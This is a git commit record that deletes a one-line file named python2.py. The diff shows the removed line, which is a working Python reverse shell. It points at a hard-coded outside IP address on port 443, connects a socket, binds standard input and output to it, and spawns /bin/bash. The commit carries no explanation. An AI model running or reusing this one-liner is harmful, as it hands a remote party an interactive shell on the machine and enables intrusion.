9f944072d0444e26346bc0d3e2a52c84b42485f1
panoriosm <62436420+michaelpanorios@users.noreply.github.com>
2024-08-01 12:11:31 +0300

    Delete python2.py

--- python2.py
+++
@@ -1,1 +0,0 @@
-export RHOST="51.107.3.204";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
